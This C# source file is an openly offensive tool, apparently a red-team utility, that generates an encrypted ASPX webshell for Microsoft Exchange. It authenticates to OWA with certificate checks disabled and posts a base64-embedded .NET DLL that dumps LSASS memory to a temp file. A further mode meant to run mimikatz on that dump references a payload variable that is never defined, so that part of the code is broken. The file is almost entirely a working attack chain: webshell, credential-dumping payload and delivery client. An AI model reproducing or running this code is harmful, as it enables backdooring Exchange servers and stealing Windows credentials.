using System;
using System.Text;
using System.Net;
using System.IO;
using System.Web;
using System.Security.Cryptography;

namespace SharpExchangeDumpHash
{
    public class Program
    {
        public static string HttpPostData(string url, string data)
        {
            Console.WriteLine("[*] Try to access: " + url);
            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";

            string key = Guid.NewGuid().ToString().Replace("-", "").Substring(16);
            Console.WriteLine("[*] Generate the random key: " + key);

            Byte[] toEncryptArray = Convert.FromBase64String(data);
            Byte[] toEncryptKey = Encoding.UTF8.GetBytes(key);
            RijndaelManaged rm = new RijndaelManaged
            {
                Mode = CipherMode.CBC,
                Padding = PaddingMode.PKCS7
            };
            ICryptoTransform cTransform = rm.CreateEncryptor(toEncryptKey, toEncryptKey);
            Byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
            
            string base64str1 = Convert.ToBase64String(resultArray, 0, resultArray.Length);
            string base64str2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));

            string Param = "data=" + HttpUtility.UrlEncode(base64str1) + "&&k=" + HttpUtility.UrlEncode(base64str2);
            byte[] post = Encoding.UTF8.GetBytes(Param);
            Stream postStream = request.GetRequestStream();
            postStream.Write(post,0,post.Length);
            postStream.Close();

            HttpWebResponse response = request.GetResponse() as HttpWebResponse;    
            Stream instream = response.GetResponseStream();
            StreamReader sr = new StreamReader(instream, Encoding.UTF8);    
            string content = sr.ReadToEnd();
            return content;
        }
 
        public static string HttpPostDataAuth(string url, string username, string password, string data)
        {           
            string[] sArray = url.Split('/');
            string newurl = "https://" + sArray[2] + "/owa/auth.owa";
            Console.WriteLine("[*] Try to login");

            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
            HttpWebRequest request = WebRequest.Create(newurl) as HttpWebRequest;
            request.AllowAutoRedirect = false;
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";

            string Param = "destination=https%3A%2F%2F" + sArray[2] + "%2Fecp%2F&flags=4&forcedownlevel=0&username="+HttpUtility.UrlEncode(username)+"&password="+HttpUtility.UrlEncode(password)+"&passwordText=&isUtf8=1";            
            byte[] post=Encoding.UTF8.GetBytes(Param);
            
            Stream postStream = request.GetRequestStream();
            postStream.Write(post,0,post.Length);
            postStream.Close();

            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            if(response.StatusCode!=(HttpStatusCode)302)
            {
              Console.WriteLine("[!] Bad login response");
              System.Environment.Exit(0);
            }

            string cookie = "";
            if(response.Headers.GetValues("Set-Cookie")!=null)
            {
              foreach(string s in response.Headers.GetValues("Set-Cookie")) 
              {
                cookie+=s.Split(' ')[0]+" ";
              }
            }

            if(cookie.IndexOf("cadataKey") == -1)
            {
              Console.WriteLine("[-] Wrong password");
              System.Environment.Exit(0);
            }           
            Console.WriteLine("[+] Login success");

            Console.WriteLine("[*] Try to access: " + url);           
            request = WebRequest.Create(url) as HttpWebRequest;
            request.AllowAutoRedirect=false;
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.Headers.Add("Cookie",cookie);
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";

            string key = Guid.NewGuid().ToString().Replace("-", "").Substring(16);
            Console.WriteLine("[*] Generate the random key: " + key);

            Byte[] toEncryptArray = Convert.FromBase64String(data);
            Byte[] toEncryptKey = Encoding.UTF8.GetBytes(key);
            RijndaelManaged rm = new RijndaelManaged
            {
                Mode = CipherMode.CBC,
                Padding = PaddingMode.PKCS7
            };
            ICryptoTransform cTransform = rm.CreateEncryptor(toEncryptKey, toEncryptKey);
            Byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
            
            string base64str1 = Convert.ToBase64String(resultArray, 0, resultArray.Length);
            string base64str2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));

            string Param2 = "data=" + HttpUtility.UrlEncode(base64str1) + "&&k=" + HttpUtility.UrlEncode(base64str2);            
            byte[] post2=Encoding.UTF8.GetBytes(Param2);
            Stream postStream2 = request.GetRequestStream();
            postStream2.Write(post2,0,post2.Length);
            postStream2.Close();

            response = request.GetResponse() as HttpWebResponse;   
            Stream instream = response.GetResponseStream();
            StreamReader sr = new StreamReader(instream, Encoding.UTF8);    
            string content = sr.ReadToEnd();
            return content;
        }

        public static void ShowUsage()
        {
            string Usage = @"
Use to send payload to the Exchange webshell backdoor.
The communication is encrypted by AES.
Support function:
    generate : generate the webshell
    dumplsass: save the dump file of LSASS to C:\\Windows\\Temp\\lsass.bin
    parsedump: use mimikatz to load C:\\Windows\\Temp\\lsass.bin and save the results to C:\\Windows\\Temp\\mimikatz.log

Usage:
    <url> <user> <password> <mode>
mode:
    generate
    dumplsass
    parsedump
eg.
    SharpExchangeDumpHash.exe https://192.168.1.1/owa/auth/1.aspx no auth dumplsass
    SharpExchangeDumpHash.exe https://192.168.1.1/ecp/Education.aspx user1 123456 parsedump
";
            Console.WriteLine(Usage);
        }

        public static void Main(string[] args)
        {

            if(args.Length!=4)
            {
                ShowUsage();
                System.Environment.Exit(0);
            }            
            try
            {                
                if(args[3] == "generate")
                {
                    Console.WriteLine("[*] Mode: generate");
                    string webshell = @"
<%@ Page Language=""C#"" %>
<%
if (Request.Form[""k""]!=null&&Request.Form[""data""]!=null)
{
    Byte[] k=Convert.FromBase64String(Request.Form[""k""]);
    Byte[] c=Convert.FromBase64String(Request.Form[""data""]);
    System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(""U"").Equals(this); 
}
%>
";
                    System.IO.File.WriteAllText(@"webshell.aspx", webshell, Encoding.UTF8);
                    Console.WriteLine("[*] Save as: webshell.aspx");
                }


                else if(args[3] == "dumplsass")
                {
                    Console.WriteLine("[*] Mode: dumplsass");
                    string base64dumplsass = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAODOgGAAAAAAAAAAAOAAAiELAQsAAAoAAAAGAAAAAAAAXikAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAAwpAABPAAAAAEAAAKgCAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAZAkAAAAgAAAACgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAKgCAAAAQAAAAAQAAAAMAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABAKQAAAAAAAEgAAAACAAUAXCEAALAHAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwAgAeAAAAAQAAEQAoBQAACgoGcwYAAAoLByAgAgAAbwcAAAoMKwAIKgAAGzAHAJIAAAACAAARAH4IAAAKChYLFAxyAQAAcCgJAAAKDQkWmgwACG8KAAAKCwhvCwAACgoA3gUTBADeXwByDQAAcCgMAAAKEwVyIwAAcBEFKA0AAAoTBhEGGBkYcw4AAAoTBwAGBxEHbw8AAAoYfggAAAp+CAAACn4IAAAKKAEAAAYmAN4UEQcU/gETCBEILQgRB28QAAAKANwAACoAAAEcAAAAABoAEiwABRUAAAECAFgAI3sAFAAAAAATMAEADQAAAAMAABEAKAMAAAYAFworAAYqHgIoEQAACioAAABCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAABAAgAAI34AAKwCAABIAwAAI1N0cmluZ3MAAAAA9AUAAEwAAAAjVVMAQAYAABAAAAAjR1VJRAAAAFAGAABgAQAAI0Jsb2IAAAAAAAAAAgAAAUdVAhQJAAAAAPolMwAWAAABAAAAFgAAAAIAAAAFAAAACAAAABIAAAADAAAAAQAAAAMAAAABAAAAAQAAAAEAAAACAAAAAAAKAAEAAAAAAAYAKgAjAAYAUAAxAAYA/ADgAAYAGAHgAAYARwEnAQYAZwEnAQYAjwExAAYAyAGuAQYA4wGuAQYA9AGuAQYAEAIjAAoALwIcAgYAXAIjAAYAfwIjAAYAlwKNAgYAogKNAgYAqwKNAgYAtgKNAgYA3ALAAgYA/gIjAAYAEgMjAAYALAMcAwAAAAABAAAAAAABAAEAAQAQABgAAAAFAAEAAQAAAAAAgACRIFsACgABAFAgAAAAAJYAbQAWAAgAfCAAAAAAlgB9ABoACAA4IQAAAADGAIYAHgAIAFEhAAAAAIYYjQAjAAkAAAABAJMAAAACAJwAAAADAKYAAAAEAKwAAAAFALUAAAAGAL4AAAAHAM4AAAABANwAGQCNACcAKQCNAC0AMQCNACMAOQCNADIAQQDYATcASQCNADwASQAHAkIAWQAXAlAAYQA3AlMAYQBKAloAYQBRAl4AaQBoAmIAcQCGAmcAeQCNAG0AeQDrAngAoQAKAyMACQCNACMAsQCNACMAJwCTAJIALgATAJcALgAbAKAACAAGAL8ASAB9AI4AogFFAwMAWwABAASAAAAAAAAAAAAAAAAAAAAAAIUBAAAEAAAAAAAAAAAAAAABABoAAAAAAAQAAAAAAAAAAAAAAAEAIwAAAAAAAAAAPE1vZHVsZT4AZHVtcGxzYXNzLmRsbABVAG1zY29ybGliAFN5c3RlbQBPYmplY3QAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFNhZmVIYW5kbGUATWluaUR1bXBXcml0ZUR1bXAASXNIaWdoSW50ZWdyaXR5AE1pbmlkdW1wAEVxdWFscwAuY3RvcgBoUHJvY2VzcwBwcm9jZXNzSWQAaEZpbGUAZHVtcFR5cGUAZXhwUGFyYW0AdXNlclN0cmVhbVBhcmFtAGNhbGxiYWNrUGFyYW0Ab2JqAFN5c3RlbS5TZWN1cml0eS5QZXJtaXNzaW9ucwBTZWN1cml0eVBlcm1pc3Npb25BdHRyaWJ1dGUAU2VjdXJpdHlBY3Rpb24AU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAGR1bXBsc2FzcwBEbGxJbXBvcnRBdHRyaWJ1dGUAZGJnaGVscC5kbGwAU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbABXaW5kb3dzSWRlbnRpdHkAR2V0Q3VycmVudABXaW5kb3dzUHJpbmNpcGFsAFdpbmRvd3NCdWlsdEluUm9sZQBJc0luUm9sZQBJbnRQdHIAWmVybwBTeXN0ZW0uRGlhZ25vc3RpY3MAUHJvY2VzcwBHZXRQcm9jZXNzZXNCeU5hbWUAZ2V0X0lkAGdldF9IYW5kbGUARW52aXJvbm1lbnQAR2V0RW52aXJvbm1lbnRWYXJpYWJsZQBTdHJpbmcARm9ybWF0AFN5c3RlbS5JTwBGaWxlU3RyZWFtAEZpbGVNb2RlAEZpbGVBY2Nlc3MARmlsZVNoYXJlAE1pY3Jvc29mdC5XaW4zMi5TYWZlSGFuZGxlcwBTYWZlRmlsZUhhbmRsZQBnZXRfU2FmZUZpbGVIYW5kbGUASURpc3Bvc2FibGUARGlzcG9zZQBFeGNlcHRpb24AU3lzdGVtLlNlY3VyaXR5AFVudmVyaWZpYWJsZUNvZGVBdHRyaWJ1dGUAAAAAC2wAcwBhAHMAcwAAFVMAeQBzAHQAZQBtAFIAbwBvAHQAACV7ADAAfQBcAFQAZQBtAHAAXABsAHMAYQBzAHMALgBiAGkAbgAAAAAAWTIGdVsI5UGHhhMLzVxs0wAIt3pcVhk04IkLAAcCGAkSCQkYGBgDAAACAwAAAQQgAQIcAyAAAQUgAQEREQQgAQEIBCABAQ4EAAASIQUgAQESIQUgAQIRKQcHAxIhEiUCAgYYBgABHRIxDgMgAAgDIAAYBAABDg4FAAIODhwKIAQBDhFBEUURSQQgABJNEAcJGAkSMR0SMRJVDg4SPQIDBwECBAEAAAAIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBgJ4uAYCEU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zLlNlY3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5FQFUAhBTa2lwVmVyaWZpY2F0aW9uAQA0KQAAAAAAAAAAAABOKQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQCkAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAEwCAAAAAAAAAAAAAEwCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASsAQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAACIAQAAAQAwADAAMAAwADAANABiADAAAAAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAADwADgABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAZAB1AG0AcABsAHMAYQBzAHMALgBkAGwAbAAAACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABEAA4AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAZAB1AG0AcABsAHMAYQBzAHMALgBkAGwAbAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAYDkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

                    if((args[1] == "no") && (args[2] == "auth"))
                    {
                        Console.WriteLine("[*] Auth: Null");    
                        string result = HttpPostData(args[0], base64dumplsass);
                        Console.WriteLine("[*] Response: \n" + result);
                    }
                    else
                    {
                        Console.WriteLine("[*] Auth: "+ args[1] + " " + args[2]);    
                        string result = HttpPostDataAuth(args[0], args[1], args[2], base64dumplsass);
                        Console.WriteLine("[*] Response: \n" + result);
                    }
                }

                else if(args[3] == "parsedump")
                {
                    Console.WriteLine("[*] Mode: parsedump");

                    if((args[1] == "no") && (args[2] == "auth"))
                    {
                        Console.WriteLine("[*] Auth: Null");    
                        string result = HttpPostData(args[0], base64parsedump);
                        Console.WriteLine("[*] Response: \n" + result);
                    }
                    else
                    {
                        Console.WriteLine("[*] Auth: "+ args[1] + " " + args[2]);    
                        string result = HttpPostDataAuth(args[0], args[1], args[2], base64parsedump);
                        Console.WriteLine("[*] Response: \n" + result);
                    }
                    Console.WriteLine("[*] The data will be saved as C:\\windows\\temp\\mimikatz.log on Exchange.");
                }

                else
                {
                    Console.WriteLine("[!] Wrong parameter");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("{0}", e.Message);
                System.Environment.Exit(0);
        	}
        }
    }
}